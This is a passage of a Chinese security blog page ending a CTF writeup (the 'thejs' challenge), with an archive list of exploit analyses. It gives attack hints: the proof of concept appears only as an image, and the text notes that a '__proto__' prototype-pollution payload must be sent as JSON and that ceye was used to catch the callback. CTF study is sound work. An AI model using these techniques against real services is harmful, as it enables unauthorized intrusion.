+<p>poc<br><img src="http://static.zybuluo.com/LoRexxar/7pvi42gqs8ykm439pcg0vl9t/image.png" alt="image.png-257.4kB"></p>
+<p>需要注意一定要是json格式，否则<code>__proto__</code>会解成字符串，开始坑了很久。</p>
+<p>直接偷懒用ceye接请求，其实用什么都行<br><img src="http://static.zybuluo.com/LoRexxar/pjmb7nlix7afzs7emfwm2e4j/image.png" alt="image.png-69.1kB"></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://lorexxar.cn">LoRexxar</a>
+            <p>原文链接：<a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/">https://lorexxar.cn/2018/12/07/codingbreak-wp/</a>
+            <p>发表日期：<a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/">December 7th 2018, 11:32:39 am</a>
+            <p>更新日期：<a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/">December 7th 2018, 11:34:02 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/12/07/dzx3-4-ssrf/" title= "Discuz x3.4前台SSRF分析">
+                    <div class="nextTitle">Discuz x3.4前台SSRF分析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/12/01/contract-checklist/" title= "以太坊智能合约审计CheckList">
+                    <div class="prevTitle">以太坊智能合约审计CheckList</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:lorexxar@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/LoRexxar" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <a href="/%E5%BC%BA%E8%A1%8C%E8%A2%AB%E6%8D%A2%E5%8F%B7%E7%9A%84LoRexxar" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/romor-rexxar" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-function"><span class="toc-number">1.</span> <span class="toc-text">easy - function</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">2.</span> <span class="toc-text">easy pcrewaf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">3.</span> <span class="toc-text">easy - phpmagic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">4.</span> <span class="toc-text">easy - phplimit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-nodechr"><span class="toc-number">5.</span> <span class="toc-text">easy - nodechr</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hard-thejs"><span class="toc-number">6.</span> <span class="toc-text">hard - thejs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#js特性"><span class="toc-number">6.1.</span> <span class="toc-text">js特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#回到漏洞"><span class="toc-number">6.2.</span> <span class="toc-text">回到漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#回到题目"><span class="toc-number">6.3.</span> <span class="toc-text">回到题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完成攻击"><span class="toc-number">6.4.</span> <span class="toc-text">完成攻击</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 172
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href= "/2020/07/08/ecshop-unser-1/" >从反序列化到类型混淆漏洞 -- 记一次ecshop实例利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span><a class="archive-post-title" href= "/2020/05/11/dz-3-4-windows/" >空指针-Base on windows Writeup  -- 最新版DZ3.4实战渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2020/02/03/chrome-ext-3/" >从0开始入门Chrome Ext安全（番外篇） -- Zoomeye Tools</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/css-mysql-chain/" >CSS-T | Mysql Client 任意文件读取攻击链拓展</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/2019/12/30/pwnhub-jade/" >pwnhub 被污染的Jade</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href= "/2019/12/05/chrome-ext-2/" >从0开始入门Chrome Ext安全（二） -- 安全的Chrome Ext</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2019/11/22/chrome-ext-1/" >从0开始入门Chrome Ext安全（一） -- 了解一个Chrome Ext</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/25</span><a class="archive-post-title" href= "/2019/10/25/php-fpm-rce/" >PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2019/09/23/javaweb-S2/" >从零开始学java web - struts2 RCE分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2019/07/23/gitea-cve-2019-11229/" >CVE-2019-11229详细分析 --git config可控-RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2019/06/12/mybb-1820-rce/" >Mybb 18.20 From Stored XSS to RCE 分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/mimic-ctf-2019/" >MIMIC Defense CTF 2019 final writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2019/04/19/drupal-1-click-rce/" >Drupal 1-click to RCE分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/dzx3-4-ssrf/" >Discuz x3.4前台SSRF分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/codingbreak-wp/" >Code Breaking挑战赛 Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2018/12/01/contract-checklist/" >以太坊智能合约审计CheckList</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2018/11/20/lctf2018-ggbank/" >LCTF2018 ggbank 薅羊毛实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/dvp-contract-wp/" >从DVP GAME到变量覆盖问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/hctf2018-web/" >HCTF2018部分Web题目Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/hctf2019_contract_wp/" >HCTF2018智能合约两则Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2018/11/08/haotian-s-5/" >“以太坊智能合约编码隐患”影响分析报告</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2018/10/18/dice2win-safe/" >智能合约游戏之殇——Dice2win安全分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2018/09/25/haotian-s-4/" >“以太坊智能合约编码设计问题”影响分析报告</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/14</span><a class="archive-post-title" href= "/2018/09/14/blockwell/" >blockwell.ai 虚假转账 事件分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2018/09/06/haotian-s-3/" >“以太坊智能合约编码安全问题”影响分析报告</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/eth-gamedead/" >智能合约游戏之殇-类Fomo3D攻击分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span><a class="archive-post-title" href= "/2018/08/22/haotian-s-2/" >“以太坊智能合约设计缺陷问题”影响分析报告</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2018/08/14/haotian-s-1/" >“以太坊智能合约规范问题”影响分析报告</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/0ctf2018-final/" >0CTF/TCTF2018 Final Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2018/04/20/SW-xss/" >基于Service Worker 的XSS攻击面拓展</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2018/04/17/0ctf2018-space/" >TCTF/0CTF2018 h4x0rs.space Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/0ctf2018-club2/" >TCTF/0CTF2018 h4xors.club2 Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/05</span><a class="archive-post-title" href= "/2018/04/05/0ctf2018-other/" >TCTF/0CTF2018 部分Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/05</span><a class="archive-post-title" href= "/2018/04/05/0ctf2018-blog/" >TCTF/0CTF2018 XSS bl0g Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2018/02/23/hctf2017/" >吐槽HCTF2017</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
